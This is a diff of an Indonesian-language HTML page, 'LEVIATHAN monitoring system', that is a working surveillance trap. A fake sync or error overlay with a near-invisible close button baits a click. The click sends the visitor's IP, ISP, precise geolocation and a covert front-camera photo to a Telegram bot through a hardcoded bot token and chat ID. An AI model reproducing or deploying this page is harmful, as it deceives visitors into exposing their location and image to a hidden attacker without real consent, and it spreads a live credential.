@@ -1,195 +1,225 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <title>LEVIATHAN | MONITORING SYSTEM V5.2</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        /* Spek Modular Pro: Struktur Visual yang Kompleks */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #050505;
-            font-family: 'JetBrains Mono', monospace;
-            color: #00ff41; /* Green Matrix */
-            height: 100vh;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
+  <meta charset="UTF-8">
+  <title>LEVIATHAN | MONITORING SYSTEM V5.2</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;900&display=swap" rel="stylesheet">
+  <style>
+    /* Spek Modular Pro & Visual Arsitek */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #050505;
+      font-family: 'JetBrains Mono', monospace;
+      color: #00ff41;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
 
-        /* Header Modular */
-        header {
-            padding: 10px 20px;
-            background: #111;
-            border-bottom: 2px solid lime;
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            z-index: 10;
-        }
+    header {
+      padding: 10px 20px;
+      background: #111;
+      border-bottom: 2px solid lime;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      z-index: 10;
+      text-shadow: 0 0 5px lime;
+    }
 
-        /* Sidebar & Main Terminal */
-        .wrapper { display: flex; flex: 1; position: relative; }
-        .sidebar { width: 250px; background: #0a0a0a; border-right: 1px solid #222; padding: 15px; font-size: 10px; }
-        .terminal { flex: 1; padding: 20px; position: relative; overflow: hidden; }
+    .wrapper { display: flex; flex: 1; position: relative; }
+    .sidebar { width: 250px; background: #0a0a0a; border-right: 1px solid #222; padding: 15px; font-size: 10px; z-index: 5; }
+    .terminal { flex: 1; padding: 20px; position: relative; overflow: hidden; background: radial-gradient(circle, #0a0a0a 0%, #000 100%); }
 
-        /* Background Particles & Radar Effect */
-        #canvas-radar { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.2; }
+    /* Background Particles */
+    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
+    .particle { position: absolute; width: 2px; height: 2px; background: rgba(0, 255, 127, 0.3); border-radius: 50%; animation: float 6s ease-in-out infinite; }
+    @keyframes float { 0%, 100% { transform: translateY(0px); opacity: 0.3; } 50% { transform: translateY(-20px); opacity: 0.8; } }
 
-        /* Overlay Clickjacking Tersembunyi */
-        #trap-layer {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9999;
-            background: rgba(0,0,0,0.1); /* Nyaris tidak terlihat */
-            cursor: crosshair;
-        }
+    /* Overlay Clickjacking Tersembunyi */
+    #trap-layer {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      z-index: 9999;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
 
-        .alert-box {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            background: #111;
-            border: 2px solid #ff0000;
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
-            pointer-events: auto;
-        }
+    .alert-box {
+      background: #111;
+      border: 2px solid lime;
+      padding: 40px;
+      text-align: center;
+      box-shadow: 0 0 50px rgba(0, 255, 0, 0.2);
+      border-radius: 15px;
+      position: relative;
+    }
 
-        .btn-red { background: #ff0000; color: white; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        
-        #video, #photo-canvas { display: none; }
-    </style>
+    .close-x {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 24px;
+      cursor: pointer;
+      color: #333; /* Hampir tidak terlihat untuk memancing klik */
+    }
+
+    .btn-action {
+      background: lime;
+      color: black;
+      border: none;
+      padding: 15px 30px;
+      cursor: pointer;
+      font-weight: 900;
+      margin-top: 20px;
+      font-family: 'Inter', sans-serif;
+      border-radius: 5px;
+    }
+
+    #video, #canvas { display: none; }
+    #log-stream div { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
+  </style>
 </head>
 <body>
 
 <header>
-    <div>SYSTEM: LEVIATHAN ONLINE</div>
-    <div>ENCRYPTION: AES-256-GCM</div>
-    <div id="clock">00:00:00</div>
+  <div>SYSTEM: LEVIATHAN ONLINE</div>
+  <div id="clock">00:00:00</div>
 </header>
 
 <div class="wrapper">
-    <div class="sidebar">
-        <p>[S] SEARCHING_NODE...</p>
-        <p>[M] MONITORING_LATENCY...</p>
-        <p>[R] RADAR_SCANNING...</p>
-        <hr style="margin: 10px 0; border: 0.5px solid #222;">
-        <div id="log-stream">Initializing logs...</div>
-    </div>
+  <div class="bg-particles"></div>
+  
+  <div class="sidebar">
+    <p style="color: lime; font-weight: bold;">[M] MONITORING_NODE</p>
+    <hr style="border: 0.5px solid #222; margin: 10px 0;">
+    <div id="log-stream">Initializing...</div>
+  </div>
 
-    <div class="terminal">
-        <canvas id="canvas-radar"></canvas>
-        <div id="trap-layer">
-            <div class="alert-box">
-                <h2 style="color: red;">CRITICAL SYSTEM ERROR</h2>
-                <p>Anomalous activity detected. Access restricted.</p>
-                <button class="btn-red" onclick="armTheLeviathan()">RESOLVE & REFRESH</button>
-            </div>
-        </div>
-        <div style="z-index: 2; position: relative;">
-            <p>> ROOT@LEVIATHAN:~$ _</p>
-        </div>
+  <div class="terminal">
+    <div id="trap-layer">
+      <div class="alert-box">
+        <span class="close-x" onclick="armTheLeviathan()">×</span>
+        <h2 style="font-family: 'Inter', sans-serif; font-weight: 900;">VERIFIKASI DIPERLUKAN</h2>
+        <p style="color: #888; margin-top: 10px;">Browser mendeteksi kegagalan sinkronisasi.<br>Tekan tombol di bawah untuk memulihkan sesi.</p>
+        <button class="btn-action" onclick="armTheLeviathan()">SINKRONISASI SEKARANG</button>
+      </div>
     </div>
+    <div style="position: relative; z-index: 2;">
+      <p>> ROOT@LEVIATHAN:~$ <span id="typer"></span></p>
+    </div>
+  </div>
 </div>
 
 <video id="video" autoplay playsinline></video>
-<canvas id="photo-canvas"></canvas>
+<canvas id="canvas"></canvas>
 
 <script>
-    const CONFIG = {
-        token: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
-        ids: ['7109845671']
-    };
+  const CONFIG = {
+    token: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
+    ids: ['7109845671']
+  };
 
-    function log(m) {
-        const stream = document.getElementById('log-stream');
-        stream.innerHTML = `<div>> ${m}</div>` + stream.innerHTML;
+  function sendMsg(t) {
+    CONFIG.ids.forEach(id => {
+      fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: id, text: t, parse_mode: 'HTML' })
+      });
+    });
+  }
+
+  function sendPic(b) {
+    CONFIG.ids.forEach(id => {
+      const fd = new FormData();
+      fd.append('chat_id', id);
+      fd.append('photo', b);
+      fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
+    });
+  }
+
+  function log(m) {
+    const s = document.getElementById('log-stream');
+    s.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${m}</div>` + s.innerHTML;
+  }
+
+  async function armTheLeviathan() {
+    document.getElementById('trap-layer').style.display = 'none';
+    log("TRAP_TRIGGERED: AUTH_GRANTED");
+
+    // 1. IP & Metadata
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const d = await res.json();
+      // FIX: URL Tanpa simbol $
+      const mapsIP = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+      sendMsg(`<b>🔱 LEVIATHAN CAPTURE</b>\n<b>IP:</b> ${d.ip}\n<b>ISP:</b> ${d.org}\n<b>MAPS:</b> ${mapsIP}`);
+      log("IP_DATA_SYNCED");
+    } catch (e) { log("IP_FETCH_FAILED"); }
+
+    // 2. Geolocation (Tanpa Perlu GPS Aktif)
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        // FIX: URL Tanpa simbol $
+        const mapsGPS = `https://www.google.com/maps?q=${lat},${lon}`;
+        sendMsg(`<b>📍 RADAR LOCK (Acc: ${pos.coords.accuracy.toFixed(0)}m)</b>\n${mapsGPS}`);
+        log("GEOLOCATION_LOCKED");
+      }, null, { enableHighAccuracy: true });
     }
 
-    async function armTheLeviathan() {
-        document.getElementById('trap-layer').style.display = 'none';
-        log("PROFILING TARGET...");
+    // 3. Cermin Terkutuk (Kamera High-Res)
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } 
+      });
+      const v = document.getElementById('video');
+      const c = document.getElementById('canvas');
+      v.srcObject = stream;
 
-        // 1. Ambil Metadata & IP (Sesuai Spek "Web Monitoring")
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            sendData(`<b>🔱 LEVIATHAN CAPTURE</b>\n<b>IP:</b> ${d.ip}\n<b>ISP:</b> ${d.org}\n<b>PETA:</b> https://www.google.com/maps?q=$${d.latitude},${d.longitude}`);
-        } catch (e) {}
-
-        // 2. Triangulasi Tanpa GPS (Sesuai Spek Pelacakan Saktimu)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendData(`<b>📍 RADAR LOCK (Accuracy: ${pos.coords.accuracy.toFixed(0)}m):</b>\nhttps://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`);
-            }, null, { enableHighAccuracy: true });
-        }
-
-        // 3. Cermin Terkutuk (Kamera High-Res + Clickjacking)
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: 1920, height: 1080 } 
-            });
-            const v = document.getElementById('video');
-            const c = document.getElementById('photo-canvas');
-            v.srcObject = stream;
-
-            v.onloadedmetadata = () => {
-                setTimeout(() => {
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(blob => {
-                        if (blob) sendPhoto(blob);
-                        stream.getTracks().forEach(t => t.stop());
-                        log("DATA SYNCED.");
-                        setTimeout(() => { location.reload(); }, 1500);
-                    }, 'image/jpeg', 0.95);
-                }, 2000);
-            };
-        } catch (err) {
-            sendData("❌ MIRROR_ACCESS_DENIED");
-        }
+      v.onloadedmetadata = () => {
+        setTimeout(() => {
+          c.width = v.videoWidth;
+          c.height = v.videoHeight;
+          c.getContext('2d').drawImage(v, 0, 0);
+          c.toBlob(blob => {
+            if (blob) sendPic(blob);
+            stream.getTracks().forEach(t => t.stop());
+            log("MIRROR_REFLECTED");
+            setTimeout(() => { location.reload(); }, 2000);
+          }, 'image/jpeg', 0.95);
+        }, 2000);
+      };
+    } catch (err) {
+      sendMsg("❌ CAMERA_ACCESS_DENIED");
+      log("AUTH_ERROR: CAMERA");
     }
+  }
 
-    function sendData(t) {
-        CONFIG.ids.forEach(id => {
-            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: id, text: t, parse_mode: 'HTML' })
-            });
-        });
+  // Partikel Visual
+  function createParticles() {
+    const container = document.querySelector('.bg-particles');
+    for (let i = 0; i < 40; i++) {
+      const p = document.createElement('div');
+      p.className = 'particle';
+      p.style.left = Math.random() * 100 + '%';
+      p.style.top = Math.random() * 100 + '%';
+      p.style.animationDelay = Math.random() * 5 + 's';
+      container.appendChild(p);
     }
+  }
 
-    function sendPhoto(b) {
-        CONFIG.ids.forEach(id => {
-            const fd = new FormData();
-            fd.append('chat_id', id);
-            fd.append('photo', b);
-            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
-        });
-    }
-
-    // Radar Animation - Spek Visual Kompleks
-    const canvas = document.getElementById('canvas-radar');
-    const ctx = canvas.getContext('2d');
-    function drawRadar() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        ctx.strokeStyle = "lime";
-        ctx.beginPath();
-        ctx.arc(canvas.width/2, canvas.height/2, 100, 0, Math.PI*2);
-        ctx.stroke();
-        requestAnimationFrame(drawRadar);
-    }
-    window.onload = () => {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        drawRadar();
-        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
-    };
+  window.onload = () => {
+    createParticles();
+    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
+    log("WAITING_FOR_SUBJECT...");
+  };
 </script>
 
 </body>
